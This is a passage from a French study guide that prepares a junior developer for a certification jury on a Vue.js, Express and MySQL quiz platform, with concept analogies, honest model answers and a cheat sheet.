  let count = 0
  return function() {
    return ++count
  }
}

const inc = counter()
inc() // 1
inc() // 2 (count est "capturé")
```

### Q: Qu'est-ce que la programmation fonctionnelle ?

**Réponse:**
Paradigme basé sur les fonctions pures, l'immutabilité et l'absence d'effets de bord.

**Méthodes JS :** `map`, `filter`, `reduce`

```javascript
const doubled = numbers.map(n => n * 2)
const evens = numbers.filter(n => n % 2 === 0)
const sum = numbers.reduce((acc, n) => acc + n, 0)
```

---

# QUESTIONS SUR TON PROJET

### Q: Présentez votre projet en 2 minutes

**Réponse:**
QuizMaster est une plateforme web permettant aux professeurs de créer des quiz interactifs et aux élèves de les passer en ligne.

**Fonctionnalités principales :**
- Inscription/connexion avec 3 rôles (prof, élève, admin)
- Création de quiz QCM et Vrai/Faux
- Code d'accès unique pour rejoindre un quiz
- Suivi des résultats
- Paiement Stripe pour passer Premium (20 quiz au lieu de 1)
- Interface d'administration

**Stack technique :**
- Frontend : Vue.js 3, Pinia, Tailwind CSS
- Backend : Node.js, Express.js, JWT, bcrypt
- Base de données : MySQL
- CI/CD : GitHub Actions
- Tests : 199 tests (Vitest)

### Q: Pourquoi ce projet ?

**Réponse:**
- Répond à un besoin réel de digitalisation des évaluations
- Permet de démontrer les 3 blocs de compétences RNCP
- Cas d'usage concret avec authentification, paiement, admin
- Technologies modernes et demandées sur le marché

### Q: Quelles difficultés avez-vous rencontrées ?

**Réponse:**
1. **JWT** : Comprendre le flux d'authentification stateless
2. **Stripe** : Intégrer les webhooks et gérer les cas d'erreur
3. **Accessibilité** : Implémenter WCAG correctement
4. **Tests** : Mocker les dépendances externes

**Comment je les ai résolues :** Documentation, tutoriels, tests itératifs, mode test de Stripe.

### Q: Qu'auriez-vous fait différemment ?

**Réponse:**
- Utiliser TypeScript pour plus de robustesse
- Ajouter des tests E2E avec Playwright
- Implémenter un refresh token pour une meilleure sécurité
- Utiliser Nuxt.js pour le SSR et le SEO

### Q: Quelles évolutions prévoyez-vous ?

**Réponse:**
- Timer par question
- Mode temps réel (quiz synchronisés)
- Import/export de questions (CSV, Excel)
- Analytics avancés
- Application mobile

---

## Conseils pour le Jury

1. **Ne pas inventer** : Si tu ne sais pas, dis "Je ne sais pas mais je peux chercher"
2. **Donner des exemples concrets** : Référence ton code
3. **Expliquer le POURQUOI** : Pas juste le QUOI
4. **Avouer les limites** : "J'aurais pu faire X mais j'ai choisi Y parce que..."
5. **Montrer la documentation** : Prouve que tu comprends ce que tu as fait

---

## Chiffres à retenir

- **199 tests** (50 backend + 149 frontend)
- **25+ endpoints** API
- **5 tables** en BDD
- **2 rôles** : prof, élève
- **bcrypt 10 rounds**
- **WCAG 2.1 AA**
- **9,99€** Premium

---

# EXPLICATIONS DÉBUTANT (Version Simple)

Cette section explique les concepts comme si tu n'y connaissais rien. Utilise ces explications si le jury te pose des questions et que tu veux répondre simplement.

---

## C'est quoi une API ?

**Explication simple :**
C'est comme un serveur au restaurant. Tu ne vas pas en cuisine toi-même, tu passes ta commande au serveur, et il te ramène ton plat.

- Le **client** (toi) = le site web
- Le **serveur** (la personne) = l'API
- La **cuisine** = la base de données

**Dans mon projet :** Quand tu cliques "Créer un quiz", le site envoie une demande à l'API, l'API va chercher/enregistrer dans la base de données, et renvoie la réponse au site.

---

## C'est quoi un token JWT ?

**Explication simple :**
C'est comme un bracelet de festival. Quand tu arrives, on vérifie ton billet et on te donne un bracelet. Après, tu montres juste ton bracelet pour entrer partout sans repasser par la billetterie.

- Tu te connectes (billet) → tu reçois un token (bracelet)
- À chaque page, tu montres ton token → le serveur te laisse passer
- Le token expire → tu dois te reconnecter

**Ce que je sais :** Le token contient des infos (ton id, ton rôle) et il est signé pour qu'on ne puisse pas le modifier.

**Ce que je ne maîtrise pas encore :** Les détails cryptographiques de la signature.

---

## C'est quoi le hashage ?

**Explication simple :**
C'est comme un hachoir à viande. Tu mets de la viande, ça ressort en steak haché. Mais tu ne peux pas refaire le morceau de viande à partir du haché.

- Mot de passe "Password123" → hash "a7f8b2c9e4d..."
- On ne peut pas retrouver "Password123" à partir du hash
- Pour vérifier, on re-hashe et on compare

**Pourquoi c'est important :** Même si quelqu'un vole la base de données, il ne peut pas lire les mots de passe.

---

## C'est quoi une injection SQL ?

**Explication simple :**
C'est comme si au guichet de la banque tu demandais : "Je voudrais retirer 100€ de mon compte... ET donner accès à tous les comptes."

Si le guichetier exécute bêtement ta demande sans vérifier, c'est dangereux.

**Protection :** J'utilise des requêtes préparées. C'est comme si le guichetier avait un formulaire avec des cases à remplir. Tu ne peux mettre que ce qui est prévu.

```
❌ Dangereux : "SELECT * FROM users WHERE email = '" + email + "'"
✅ Sécurisé : "SELECT * FROM users WHERE email = ?", [email]
```

---

## C'est quoi un middleware ?

**Explication simple :**
C'est comme les vigiles à l'entrée d'une boîte de nuit.
- Vigile 1 : Tu as ta carte d'identité ? (authentification)
- Vigile 2 : Tu es sur la liste VIP ? (autorisation)
- Si tu passes les deux → tu entres

**Dans mon code :**
```
Requête → [Vérifie token] → [Vérifie rôle] → Code principal
```

Si tu échoues à une étape, tu es bloqué.

---

## C'est quoi un webhook ?

**Explication simple :**
C'est comme quand tu commandes un colis et que le livreur te prévient "J'arrive dans 5 minutes".

Tu n'appelles pas le livreur toutes les 2 minutes pour demander "T'es où ?". C'est LUI qui te contacte quand il y a du nouveau.

**Avec Stripe :**
- Le client paie sur Stripe
- Stripe m'appelle : "Hey, le paiement est passé !"
- Je mets à jour ma base de données

---

## C'est quoi Pinia ?

**Explication simple :**
C'est comme un tableau blanc partagé dans un bureau. Tout le monde peut le voir et le modifier.

Sans Pinia : chaque page a ses propres infos, elles ne se parlent pas.
Avec Pinia : les infos sont sur le tableau, toutes les pages y accèdent.

**Exemple :** Quand tu te connectes, je stocke ton profil dans Pinia. Toutes les pages peuvent savoir qui tu es sans redemander au serveur.

---

## C'est quoi une clé étrangère ?

**Explication simple :**
C'est comme une adresse dans un carnet. Au lieu de recopier toutes les infos de quelqu'un, tu notes juste son adresse pour le retrouver.

**Dans ma BDD :**
- Table `quizzes` a une colonne `user_id`
- Ce `user_id` pointe vers la table `users`
- Je n'ai pas besoin de recopier le nom, email, etc. dans `quizzes`

---

## C'est quoi CASCADE DELETE ?

**Explication simple :**
C'est comme supprimer un dossier sur ton ordinateur. Si tu supprimes le dossier "Photos vacances", toutes les photos dedans sont supprimées aussi.

**Dans ma BDD :** Si je supprime un utilisateur, tous ses quiz, questions et résultats sont supprimés automatiquement.

---

## C'est quoi le responsive design ?

**Explication simple :**
C'est comme un t-shirt qui s'adapte à toutes les tailles. Le site s'affiche bien sur téléphone, tablette et ordinateur.

**Comment je fais :** J'utilise Tailwind CSS qui a des classes pour chaque taille d'écran.

---

## C'est quoi un test automatisé ?

**Explication simple :**
C'est comme un correcteur automatique. Au lieu de vérifier à la main que tout marche, j'écris des vérifications que l'ordinateur fait pour moi.

**Exemple :**
```
Test : "Si j'envoie un email invalide, ça doit échouer"
→ J'envoie "pas-un-email"
→ Je vérifie que l'erreur est "Email invalide"
```

**Pourquoi c'est utile :** Si je modifie mon code et que je casse quelque chose, les tests me préviennent.

---

## C'est quoi CI/CD ?

**Explication simple :**
C'est comme un contrôle qualité automatique à l'usine. À chaque fois que je pousse mon code sur GitHub :
1. Ça vérifie que le code est bien écrit
2. Ça lance tous les tests
3. Si tout est vert → c'est bon
4. Si c'est rouge → il y a un problème

**Avantage :** Je ne peux pas oublier de lancer les tests.

---

# RÉPONSES HONNÊTES QUAND TU NE SAIS PAS

## Formules à utiliser

| Situation | Ce que tu dis |
|-----------|---------------|
| Tu ne sais pas du tout | "Je ne connais pas ce sujet en détail, c'est quelque chose que je dois encore apprendre." |
| Tu sais un peu | "Je comprends le principe de base : [explication simple]. Mais je ne maîtrise pas les détails techniques." |
| Tu as fait sans comprendre | "J'ai suivi la documentation et ça fonctionne, mais je ne saurais pas l'expliquer en profondeur." |
| C'est hors de ton projet | "Je n'ai pas eu besoin de ça dans mon projet, mais je sais que ça existe." |

---

## Questions difficiles et réponses honnêtes

### "Pourquoi localStorage et pas les cookies HttpOnly ?"

**Réponse honnête :**
> "J'ai utilisé localStorage parce que c'est ce que j'ai appris et c'est plus simple à mettre en place. Je sais que les cookies HttpOnly seraient plus sécurisés parce qu'ils ne sont pas accessibles par JavaScript, donc protégés contre les attaques XSS. Mais je ne maîtrise pas encore cette implémentation."

---

### "Comment tu scalerais ton application ?"

**Réponse honnête :**
> "Je n'ai pas encore étudié cette partie. Je sais que ça existe, qu'on peut utiliser plusieurs serveurs avec un load balancer, mais je ne saurais pas le mettre en place aujourd'hui. C'est quelque chose que je veux apprendre."

---

### "Pourquoi pas TypeScript ?"

**Réponse honnête :**
> "Je ne maîtrise pas encore TypeScript. J'ai préféré me concentrer sur JavaScript pour bien comprendre les bases. TypeScript est sur ma liste d'apprentissage pour la suite."

---

### "Comment fonctionne exactement la signature JWT ?"

**Réponse honnête :**
> "Je sais que le token est signé avec une clé secrète côté serveur, et que ça permet de vérifier qu'il n'a pas été modifié. Mais les détails cryptographiques, je ne les maîtrise pas."

---

### "Que se passe-t-il si le webhook Stripe échoue ?"

**Réponse honnête :**
> "Honnêtement, je ne sais pas exactement. J'ai lu dans la documentation que Stripe réessaie automatiquement, mais je n'ai pas approfondi ce cas. C'est quelque chose que je devrais mieux comprendre pour une application en production."

---

### "Pourquoi tu n'as pas utilisé Docker ?"

**Réponse honnête :**
> "Je n'ai pas encore appris Docker. Pour ce projet solo en développement local, XAMPP était suffisant. Je sais que Docker serait utile pour avoir le même environnement partout et pour le déploiement, mais je ne le maîtrise pas encore."

---

### "C'est quoi le rate limiting ? Pourquoi tu ne l'as pas fait ?"

**Réponse honnête :**
> "Le rate limiting, c'est limiter le nombre de requêtes qu'un utilisateur peut faire. Ça protège contre les attaques par force brute. Je ne l'ai pas implémenté parce que je ne savais pas comment faire, mais je sais que c'est important pour la sécurité en production."

---

### "Comment tu gères les refresh tokens ?"

**Réponse honnête :**
> "Je n'ai pas implémenté de refresh token. J'utilise un seul token JWT qui expire. Je sais que le système access token + refresh token est plus sécurisé, mais je n'ai pas encore appris à le mettre en place."

---

### "C'est quoi la différence entre SSR et CSR ?"

**Réponse honnête :**
> "CSR c'est ce que je fais : le JavaScript s'exécute dans le navigateur pour afficher la page. SSR c'est quand le serveur génère le HTML directement. SSR est meilleur pour le SEO. Je sais que Nuxt.js permet de faire du SSR avec Vue, mais je ne l'ai pas utilisé."

---

## Les aveux qui passent bien

Le jury préfère quelqu'un d'honnête à quelqu'un qui invente. Ces phrases montrent ta maturité :

- "C'est une limite de mon projet que j'ai identifiée."
- "C'est quelque chose que je ferais différemment avec plus d'expérience."
- "Je comprends le concept mais pas l'implémentation détaillée."
- "J'ai fait ce choix par simplicité, sachant qu'il existe des alternatives plus robustes."
- "C'est sur ma liste d'apprentissage."

---

## Ce que tu DOIS savoir expliquer (le minimum)

| Sujet | Tu dois pouvoir dire... |
|-------|------------------------|
| **Ton projet** | Ce qu'il fait, pour qui, les fonctionnalités principales |
| **Ta stack** | Pourquoi Vue, Node, MySQL (même si c'est "c'est ce que j'ai appris") |
| **L'authentification** | Login → token → stockage → vérification |
| **La sécurité basique** | Mots de passe hashés, requêtes préparées |
| **Tes tests** | Pourquoi tu testes, combien tu en as, ce qu'ils vérifient |
| **Ta plus grosse difficulté** | Ce qui t'a bloqué et comment tu l'as résolu |

---

## Exemple de réponse complète (modèle)

**Question :** "Expliquez comment fonctionne l'authentification dans votre application."

**Bonne réponse (niveau débutant) :**

> "Quand un utilisateur se connecte, il envoie son email et mot de passe. Mon serveur vérifie que l'email existe et que le mot de passe correspond — je compare le hash, pas le mot de passe en clair. Si c'est bon, je génère un token JWT qui contient l'id et le rôle de l'utilisateur.
>
> Ce token est renvoyé au frontend qui le stocke dans localStorage. À chaque requête vers l'API, le frontend ajoute ce token dans les headers. Côté serveur, mon middleware vérifie que le token est valide avant d'autoriser l'accès.
>
> Je sais que localStorage n'est pas la méthode la plus sécurisée — les cookies HttpOnly seraient mieux — mais c'est ce que j'ai appris et ça fonctionne pour ce projet."

**Pourquoi c'est bien :**
- Tu expliques le flux simplement
- Tu montres que tu comprends ce que tu as fait
- Tu avoues une limite sans t'excuser
- Tu ne prétends pas tout maîtriser

---

## Derniers conseils

1. **Respire** — C'est normal de ne pas tout savoir
2. **Prends ton temps** — Mieux vaut réfléchir que dire n'importe quoi
3. **Reformule** — "Si je comprends bien votre question..."
4. **Montre ton code** — "Je peux vous montrer dans le code si vous voulez"
5. **Sois toi-même** — Le jury sait que tu es junior

---

# AUTRES CONCEPTS EXPLIQUÉS SIMPLEMENT

## C'est quoi CORS ?

**Explication simple :**
C'est comme un videur qui vérifie si tu viens du bon quartier.

Par défaut, un site web ne peut pas appeler un serveur sur un autre domaine. C'est une protection du navigateur.

- Mon site est sur `localhost:5173`
- Mon API est sur `localhost:3000`
- Ce sont deux "quartiers" différents → bloqué par défaut

**Solution :** Je dis à mon serveur "Accepte les demandes qui viennent de localhost:5173".

---

## C'est quoi bcrypt ?

**Explication simple :**
C'est une machine à crypter les mots de passe.

- Tu mets le mot de passe dedans
- Ça ressort un truc illisible (le hash)
- Impossible de revenir en arrière
- Même mot de passe = hash différent à chaque fois (grâce au salt)

**Le "10 rounds"** : C'est le nombre de fois que la machine "mélange". Plus c'est haut, plus c'est sécurisé mais plus c'est lent.

---

## C'est quoi Axios ?

**Explication simple :**
C'est un facteur qui envoie et reçoit des lettres pour moi.

Au lieu d'écrire moi-même tout le code pour envoyer une requête HTTP, j'utilise Axios qui fait ça pour moi plus simplement.

```javascript
// Sans Axios (compliqué)
fetch('/api/quizzes', {
  method: 'GET',
  headers: { 'Authorization': 'Bearer ' + token }
}).then(res => res.json()).then(data => ...)

// Avec Axios (simple)
axios.get('/api/quizzes')
```

---

## C'est quoi Tailwind CSS ?

**Explication simple :**
C'est comme des Legos pour le design.

Au lieu d'écrire du CSS personnalisé, j'utilise des classes toutes faites :
- `bg-blue-500` = fond bleu
- `text-white` = texte blanc
- `p-4` = padding de 4 (espacement intérieur)
- `rounded` = coins arrondis

**Avantage :** Je n'ai pas besoin de créer un fichier CSS, tout est dans les classes HTML.

---

## C'est quoi Vue Router ?

**Explication simple :**
C'est le GPS de mon application.

Il dit : "Si l'utilisateur va sur /dashboard, affiche la page Dashboard. Si il va sur /login, affiche la page Login."

**Les guards :** Ce sont des barrières. Avant d'aller sur /dashboard, je vérifie que l'utilisateur est connecté. Sinon, je le renvoie vers /login.

---

## C'est quoi un composant Vue ?

**Explication simple :**
C'est un morceau de page réutilisable.

Imagine une carte de quiz. Plutôt que de recopier le code 10 fois pour 10 quiz, je crée UN composant `QuizCard` et je l'utilise 10 fois.

```
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│  QuizCard   │  │  QuizCard   │  │  QuizCard   │
│  Quiz 1     │  │  Quiz 2     │  │  Quiz 3     │
└─────────────┘  └─────────────┘  └─────────────┘

→ 1 seul code, utilisé 3 fois
```

---

## C'est quoi async/await ?

**Explication simple :**
C'est une façon d'attendre qu'une tâche soit finie avant de continuer.

**Sans async/await :**
```javascript
// Je commande un café, mais je n'attends pas qu'il soit prêt
commander()
boire() // J'essaie de boire alors que le café n'est pas prêt !
```

**Avec async/await :**
```javascript
// J'attends que le café soit prêt avant de boire
await commander()
boire() // Le café est prêt, je peux boire
```

---

## C'est quoi le .env ?

**Explication simple :**
C'est un coffre-fort pour mes secrets.

Je ne mets jamais mes mots de passe ou clés API directement dans le code. Je les mets dans un fichier `.env` qui n'est JAMAIS envoyé sur GitHub.

```
DB_PASSWORD=monsupermotdepasse
JWT_SECRET=maclesecrete
STRIPE_KEY=sk_test_xxx
```

**Dans le code :** Je lis ces valeurs avec `process.env.DB_PASSWORD`

---

## C'est quoi npm ?

**Explication simple :**
C'est un supermarché de code.

Plutôt que de tout coder moi-même, je "fais mes courses" et j'installe des packages déjà faits :
- `express` pour créer mon serveur
- `bcrypt` pour crypter les mots de passe
- `axios` pour faire des requêtes HTTP

**Commandes :**
- `npm install` = Je remplis mon panier (installation)
- `npm run dev` = Je lance mon projet
- `npm test` = Je lance les tests

---

## C'est quoi Git ?

**Explication simple :**
C'est une machine à remonter le temps pour ton code.

À chaque "commit", je sauvegarde une version de mon code. Si je casse tout, je peux revenir en arrière.

**Commandes simples :**
- `git add .` = Je prépare mes changements
- `git commit -m "message"` = Je sauvegarde avec un commentaire
- `git push` = J'envoie sur GitHub
- `git pull` = Je récupère les changements

---

## C'est quoi GitHub ?

**Explication simple :**
C'est un cloud pour stocker mon code.

- Mon code est sauvegardé en ligne
- Je peux y accéder de n'importe où
- D'autres personnes peuvent voir mon code (si public)
- GitHub Actions lance des vérifications automatiques

---

## C'est quoi ESLint ?

**Explication simple :**
C'est un correcteur orthographique pour le code.

Il me dit : "Attention, tu as une variable que tu n'utilises pas" ou "Tu as oublié un point-virgule".

**Ça ne corrige pas les bugs**, ça corrige les erreurs de style et les oublis.

---

## C'est quoi Prettier ?

**Explication simple :**
C'est un coiffeur pour le code.

Il remet tout le code en forme automatiquement :
- Bonne indentation
- Guillemets cohérents
- Espaces au bon endroit

**ESLint vs Prettier :**
- ESLint = Vérifie les erreurs (qualité)
- Prettier = Remet en forme (apparence)

---

## C'est quoi Vitest ?

**Explication simple :**
C'est l'outil qui lance mes tests automatiquement.

J'écris mes tests, et Vitest les exécute et me dit lesquels passent (vert) ou échouent (rouge).

---

## C'est quoi Vite ?

**Explication simple :**
C'est le moteur de mon site en développement.

Quand je tape `npm run dev`, Vite démarre un serveur local et affiche mon site. Quand je modifie un fichier, la page se met à jour automatiquement.

**Vite vs Webpack :** Vite est plus récent et beaucoup plus rapide.

---

# QUESTIONS SUPPLÉMENTAIRES DU JURY

## Sur ton parcours

### "Pourquoi le développement web ?"

**Réponse possible :**
> "J'ai toujours aimé créer des choses. Le développement web me permet de créer des applications que les gens peuvent utiliser. J'aime le côté concret : je code quelque chose, je vois le résultat immédiatement."

---

### "Qu'est-ce qui t'a le plus plu dans ce projet ?"

**Réponse possible :**
> "Voir l'application fonctionner de bout en bout. Partir de rien et arriver à une application où quelqu'un peut vraiment créer un quiz et le faire passer à d'autres personnes. C'est gratifiant de voir que ça marche."

---

### "Qu'est-ce qui t'a le plus frustré ?"

**Réponse possible :**
> "Les bugs qui prennent des heures à trouver alors que c'était une erreur toute bête. Ça m'a appris à mieux lire les messages d'erreur et à tester plus souvent."

---

## Sur le code

### "Montre-moi un bout de code dont tu es fier"

**Ce que tu peux montrer :**
- Le middleware d'authentification
- La création de quiz avec vérification de limite
- Un composant Vue avec sa logique

**Ce que tu dis :**
> "Ce code vérifie que l'utilisateur est connecté avant d'accéder à une route. C'est simple mais c'est la base de toute la sécurité de l'application."

---

### "Montre-moi un bout de code que tu améliorerais"

**Réponse honnête :**
> "Il y a des endroits où j'ai répété du code. Par exemple, la gestion des erreurs pourrait être centralisée dans une fonction utilitaire au lieu d'être copiée-collée. Avec plus d'expérience, je ferais ça mieux."

---

### "Comment tu débugues quand quelque chose ne marche pas ?"

**Réponse simple :**
> "D'abord je lis le message d'erreur. Ensuite j'utilise console.log pour voir ce qui se passe à chaque étape. Si je ne trouve pas, je cherche l'erreur sur Google ou Stack Overflow."

---

## Sur les choix techniques

### "Pourquoi Vue plutôt que React ?"

**Réponse honnête :**
> "C'est ce qu'on m'a enseigné en formation. J'ai appris Vue et je me suis senti à l'aise avec. Je sais que React est aussi très populaire, mais je n'ai pas encore eu l'occasion de l'apprendre."

---

### "Pourquoi MySQL plutôt que MongoDB ?"

**Réponse simple :**
> "Mes données sont structurées et ont des relations entre elles : un utilisateur a des quiz, un quiz a des questions. MySQL est fait pour ça. MongoDB serait mieux pour des données plus flexibles, sans relations fixes."

---

### "Pourquoi Express et pas Fastify ou NestJS ?"

**Réponse honnête :**
> "Express est le framework que j'ai appris. C'est le plus utilisé et il y a beaucoup de documentation. Je sais que Fastify est plus rapide et NestJS plus structuré, mais je ne les connais pas encore."

---

## Sur la sécurité

### "Ton application est-elle sécurisée ?"

**Réponse équilibrée :**
> "J'ai implémenté les bases de la sécurité : mots de passe hashés avec bcrypt, requêtes préparées contre les injections SQL, tokens JWT pour l'authentification, et Helmet pour les headers de sécurité.
>
> Mais il y a des choses que je n'ai pas faites : rate limiting contre le brute force, HTTPS en production, refresh tokens. Pour une vraie mise en production, il faudrait ajouter ces éléments."

---

### "Comment tu protèges les données des utilisateurs ?"

**Réponse simple :**
> "Les mots de passe sont hashés, donc même moi je ne peux pas les lire. Les données sensibles comme les clés API sont dans un fichier .env qui n'est pas sur GitHub. Et j'utilise des requêtes préparées pour éviter les injections SQL."

---

## Sur les tests

### "Pourquoi tu as écrit des tests ?"

**Réponse simple :**
> "Pour être sûr que mon code fonctionne, et surtout pour ne pas casser ce qui marchait quand je modifie quelque chose. C'est un filet de sécurité."

---

### "Tu as 199 tests, c'est beaucoup. Ils testent quoi ?"

**Réponse :**
> "Côté backend, je teste les routes API : est-ce que l'inscription fonctionne, est-ce qu'on peut créer un quiz, est-ce qu'un utilisateur non connecté est bien bloqué.
>
> Côté frontend, je teste les composants : est-ce que le bon texte s'affiche, est-ce que les clics déclenchent les bonnes actions, est-ce que les stores gèrent bien les données."

---

## Sur le projet

### "Si tu avais 2 semaines de plus, que ferais-tu ?"

**Réponse :**
> "J'ajouterais un timer pour les questions, comme ça le quiz serait plus dynamique. Et je ferais des tests end-to-end avec Cypress pour tester le parcours utilisateur complet."

---

### "C'est quoi le MVP ?"

**Explication simple :**
> "MVP veut dire Minimum Viable Product. C'est la version minimale de l'application qui fonctionne. Mon MVP c'est : un prof peut créer un quiz, un élève peut le passer, on voit le score. Tout le reste (timer, statistiques avancées, multijoueur) c'est pour plus tard."

---

### "Tu as travaillé seul. Comment tu t'es organisé ?"

**Réponse :**
> "J'ai découpé le projet en étapes : d'abord la base de données, puis l'authentification, puis les quiz, puis les tests. Je faisais une fonctionnalité à la fois et je testais avant de passer à la suivante."

---

# VOCABULAIRE À CONNAÎTRE

| Terme | Définition simple |
|-------|-------------------|
| **API** | Interface pour que deux logiciels communiquent |
| **REST** | Style d'architecture pour les API (utilise GET, POST, PUT, DELETE) |
| **JWT** | Token d'authentification (comme un badge) |
| **Hash** | Transformation irréversible (pour les mots de passe) |
| **Middleware** | Fonction qui s'exécute avant le code principal |
| **CRUD** | Create, Read, Update, Delete (les 4 opérations de base) |
| **SPA** | Single Page Application (le site ne recharge jamais) |
| **Responsive** | S'adapte à toutes les tailles d'écran |
| **Frontend** | Ce que l'utilisateur voit (le site) |
| **Backend** | Le serveur qui traite les données |
| **BDD** | Base de données |
| **Endpoint** | URL d'une route API |
| **Token** | Jeton d'authentification |
| **Store** | Endroit où on stocke les données partagées (Pinia) |
| **Composant** | Morceau de page réutilisable (Vue) |
| **Route** | URL et ce qui s'affiche dessus |
| **Guard** | Protection sur une route (vérifie si connecté) |
| **Webhook** | URL appelée automatiquement par un service externe |
| **CI/CD** | Vérifications et déploiement automatiques |
| **Lint** | Vérification de la qualité du code |
| **Build** | Compilation du code pour la production |

---

# ANTI-SÈCHE RAPIDE (À RELIRE AVANT LE JURY)

## Ce que fait mon application
- Les profs créent des quiz (QCM, Vrai/Faux)
- Les élèves rejoignent avec un code et passent le quiz
- On voit les scores et résultats
- Version gratuite (1 quiz) et Premium (20 quiz, 9.99€)

## Ma stack
- **Frontend** : Vue.js 3, Pinia, Tailwind CSS
- **Backend** : Node.js, Express.js
- **BDD** : MySQL
- **Tests** : Vitest (199 tests)
- **CI/CD** : GitHub Actions

## Sécurité que j'ai faite
- Mots de passe hashés (bcrypt)
- Requêtes préparées (anti-injection SQL)
- JWT pour l'authentification
- Helmet pour les headers HTTP

## Sécurité que je n'ai pas faite
- Rate limiting
- HTTPS (seulement en local)
- Refresh tokens
- Cookies HttpOnly

## Ma plus grande difficulté
Les webhooks Stripe : comprendre le flux asynchrone et comment vérifier la signature.

## Ce que je ferais en V2
- TypeScript
- Timer par question
- Mode multijoueur
- Application mobile

## Chiffres à retenir
- 199 tests
- 5 tables en BDD
- 2 rôles (prof, élève)
- 9.99€ le Premium
